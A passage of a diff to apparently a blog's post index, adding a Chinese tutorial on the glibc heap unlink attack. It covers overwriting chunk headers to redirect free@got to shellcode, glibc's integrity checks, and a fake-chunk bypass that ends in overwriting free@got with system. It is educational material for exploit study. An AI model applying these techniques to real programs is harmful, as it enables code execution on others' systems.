(!(inuse_bit_at_offset(next, nextsz)))   </span><br><span class="line">&#123;</span><br><span class="line">  sz += nextsz;</span><br><span class="line">  ...</span><br><span class="line">  unlink(next, bck, fwd);</span><br><span class="line">  next = chunk_at_offset(p, sz);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br><span class="line">next-&gt;prev_size = sz;</span><br></pre></td></tr></table></figure>
+<p>本例中，释放1st chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。</p>
+<h3 id="unlink"><a class="markdownIt-Anchor" href="#unlink"></a> unlink</h3>
+<p>当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;  \</span></span><br><span class="line">  FD = P-&gt;fd;             \</span><br><span class="line">  BK = P-&gt;bk;             \</span><br><span class="line">  FD-&gt;bk = BK;            \</span><br><span class="line">  BK-&gt;fd = FD;            \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>unlink 即为将 P 从链表中删除的过程。</p>
+<h2 id="unlink攻击"><a class="markdownIt-Anchor" href="#unlink攻击"></a> unlink攻击</h2>
+<p>在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。</p>
+<h3 id="原始的-unlink-攻击"><a class="markdownIt-Anchor" href="#原始的-unlink-攻击"></a> 原始的 unlink 攻击</h3>
+<p>述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prev_size = 偶数</span><br><span class="line">size = <span class="number">-4</span></span><br><span class="line">fd = <span class="built_in">free</span>@got - <span class="number">12</span></span><br><span class="line">bk = shellcode address</span><br></pre></td></tr></table></figure>
+<p>在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。</p>
+<p>释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 <code>P = second chunk ptr</code>，unlink 过程如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = second chunk ptr-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span></span><br><span class="line"><span class="number">2</span>）BK = second chunk ptr-&gt;bk = shellcode address</span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *((<span class="built_in">free</span>@got–<span class="number">12</span>)-&gt;bk) = shellcode address</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *(shellcode address-&gt;fd) = <span class="built_in">free</span>@got – <span class="number">12</span></span><br></pre></td></tr></table></figure>
+<p>unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 <code>FD = free@got-12</code>，<code>BK = shellcode address</code>，即 second chunk 的 fd、bk 指针分别指向 <code>free@got-12</code> 和 <code>shellcode address</code>。</p>
+<p>步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 <code>FD+12 = free@got-12+12 = free@got</code>，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 <code>free@got = shellcode address</code>，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。</p>
+<p>同理，步骤4）中将 <code>shellcode addr + 8</code> 处 4 个字节覆盖为 <code>free@got - 12</code>，所以在编写 shellcode 时应跳过这 4 个字节。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/2.png" class></strong></p>
+<h2 id="对抗技术"><a class="markdownIt-Anchor" href="#对抗技术"></a> 对抗技术</h2>
+<h3 id="double-free检测"><a class="markdownIt-Anchor" href="#double-free检测"></a> Double Free检测</h3>
+<p>该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used. */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="next-size非法检测"><a class="markdownIt-Anchor" href="#next-size非法检测"></a> next size非法检测</h3>
+<p>该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))&#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="双链表冲突检测"><a class="markdownIt-Anchor" href="#双链表冲突检测"></a> 双链表冲突检测</h3>
+<p>该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br></pre></td></tr></table></figure>
+<p>但记住，即使由上述三种检测方式并不意味着unlink技术都会失效，攻防是一个此消彼长的过程，例如下面介绍一种绕过安全检验的方法（注意具体情况具体分析）。</p>
+<h2 id="绕过安全校验"><a class="markdownIt-Anchor" href="#绕过安全校验"></a> 绕过安全校验</h2>
+<p>首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 <code>FD-&gt;bk != P || BK-&gt;fd != P</code> 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，<code>FD-&gt;bk = BK</code> 与 <code>BK-&gt;fd = FD</code> 不会执行，导致 unlink 攻击不能进行。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;         \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								          \</span><br><span class="line">        FD-&gt;bk = BK;						    \</span><br><span class="line">        BK-&gt;fd = FD;						    \</span><br><span class="line">        ...</span><br><span class="line">    &#125;									              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了绕过以上指针校验，需要以下条件：</p>
+<blockquote>
+<p>a） 程序中存在一个全局指针变量 ptr<br>
+b） ptr 指向的堆内存可由用户控制</p>
+</blockquote>
+<p>若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 成立。具体如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = ptr - <span class="number">0xC</span></span><br><span class="line">P-&gt;bk = ptr - <span class="number">0x8</span></span><br></pre></td></tr></table></figure>
+<p>在执行 unlink（P）时的指针操作如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0xC</span>;</span><br><span class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="comment">// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr</span></span><br><span class="line"><span class="comment">// 由于 ptr 指向 P,可成功绕过指针校验</span></span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *ptr = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *ptr = ptr - <span class="number">0xC</span>。</span><br></pre></td></tr></table></figure>
+<p>由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。</p>
+<p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0xC + free@got</code>，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。</p>
 ]]></content>
       <categories>
         <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
+        <category>Heap</category>
+        <category>Heap_Attack</category>
       </categories>
       <tags>
         <tag>PWN</tag>
